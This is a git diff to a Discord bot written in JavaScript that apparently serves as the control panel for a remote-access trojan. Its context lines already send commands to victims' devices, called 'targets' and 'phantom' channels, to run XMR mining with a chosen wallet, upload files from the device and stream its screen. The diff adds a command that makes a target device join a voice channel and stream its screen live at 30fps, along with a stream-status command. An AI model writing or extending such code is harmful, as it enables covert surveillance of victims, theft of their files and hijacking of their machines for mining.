@@ -9,6 +9,7 @@ import {
 import { statusCard } from './statusCard.js'
 import { ICONS } from './icons.js'
 import { C, E, A, smallCaps, mono, createBox, bold, ts, randGif, DEV_CMDS, BOT_CMDS, VALID_CMDS, ALERT_CMD_MAP, BTN_ACTIONS, formatSize, barAnim, clockText } from './utils/index.js'
+import { VideoStreamManager } from './stream.js'
 const ST_COL = { online: C.neon, offline: C.void, warning: C.gold, danger: C.electric, info: C.purple }
 const { DISCORD_TOKEN, ALLOWED_CHANNEL_ID, ALERTS_CHANNEL_ID } = process.env
 if (!DISCORD_TOKEN) { console.error('Missing DISCORD_TOKEN'); process.exit(1) }
@@ -146,6 +147,9 @@ const MAP_CLEANUP_INTERVAL = 600000
 const RATE_LIMIT_WINDOW = 5000
 const RATE_LIMIT_MAX = 10
 const COMMAND_LOG_MAX = 50
+
+// Video stream manager
+const videoStream = new VideoStreamManager(null) // Will set client after ready
 const COMMAND_COOLDOWN = 2000
 let statusCheckerId = null
 let cleanupIntervalId = null
@@ -371,6 +375,10 @@ const SLASH_CMDS = [
   new SlashCommandBuilder().setName('miner').setDescription('Control XMR mining').addStringOption(o => o.setName('action').setDescription('Action: start, stop, status, set_wallet, set_pool, set_threads').setRequired(false)).addStringOption(o => o.setName('value').setDescription('Value for action (e.g. wallet address)').setRequired(false)),
   new SlashCommandBuilder().setName('upload').setDescription('Upload file from device').addStringOption(o => o.setName('path').setDescription('File path on device').setRequired(true)),
   new SlashCommandBuilder().setName('stream').setDescription('Control live screen stream').addStringOption(o => o.setName('action').setDescription('Action: start, stop, or fps number (1-30)').setRequired(false)),
+  new SlashCommandBuilder().setName('voicestream').setDescription('Start voice channel video stream')
+    .addStringOption(o => o.setName('channel').setDescription('Voice channel ID').setRequired(true))
+    .addStringOption(o => o.setName('guild').setDescription('Guild ID').setRequired(true)),
+  new SlashCommandBuilder().setName('streamstatus').setDescription('Check video stream status'),
 ].map(c => c.toJSON())
 
 async function registerSlashCommands(guild) {
@@ -579,6 +587,37 @@ client.on(Events.InteractionCreate, async (i) => {
           const r = await sendCmdLogged(deviceCh, 'stream', streamPayload, uid, user.username)
           if (!r.ok) return i.editReply(`${E.coffin} Error: ${r.err} ${E.skull}`)
           return i.editReply({ content: `${E.knife} Stream command sent: \`!stream ${streamPayload}\` ${E.skull}`, components: RESULT_BTNS })
+        }
+        case 'voicestream': {
+          const voiceChannelId = options.getString('channel')
+          const guildId = options.getString('guild')
+          
+          await guild.channels.fetch()
+          let deviceCh = null
+          if (targets.has(uid)) {
+            const data = targets.get(uid)
+            const chId = typeof data === 'object' ? data.chId : data
+            deviceCh = guild.channels.cache.get(chId)
+            if (!deviceCh) { targets.delete(uid); return i.editReply(`${E.coffin} Target channel gone ${E.skull}`) }
+          } else {
+            const channels = getPhantomChannels(guild)
+            if (!channels.size) return i.editReply(`${E.coffin} No devices ${E.skull}`)
+            if (channels.size === 1) deviceCh = channels.first()
+            else return i.editReply(`${E.warning} Multiple devices. Use \`/target\` first ${E.skull}`)
+          }
+          
+          // Send command to device to start voice stream
+          const r = await sendCmdLogged(deviceCh, 'stream', `voice ${voiceChannelId} ${guildId}`, uid, user.username)
+          if (!r.ok) return i.editReply(`${E.coffin} Error: ${r.err} ${E.skull}`)
+          
+          return i.editReply({ content: `${E.satellite} Voice stream command sent!\nDevice will connect to voice channel and stream at 30fps.`, components: RESULT_BTNS })
+        }
+        case 'streamstatus': {
+          const status = videoStream.getStreamStatus()
+          if (!status) {
+            return i.editReply(`${E.warning} No active streams ${E.skull}`)
+          }
+          return i.editReply({ content: `${E.satellite} **Stream Status**\nActive: ${status.active}\nFPS: ${status.fps}\nResolution: ${status.resolution}\nBuffer: ${status.buffer} frames\nUptime: ${Math.floor(status.uptime / 1000)}s`, components: MENU_BTNS })
         }
       }
     } catch (err) {
@@ -1145,6 +1184,11 @@ function cleanupMapsInterval() {
 
 client.once(Events.ClientReady, async () => {
   console.log(`[+] ${client.user.tag} online`)
+
+  // Initialize video stream manager
+  videoStream.client = client
+  videoStream.startServer()
+  console.log('[+] Video stream manager initialized')
 
   // ── Memory Monitor ───────────────────────────────────────────────────────
   setInterval(() => {
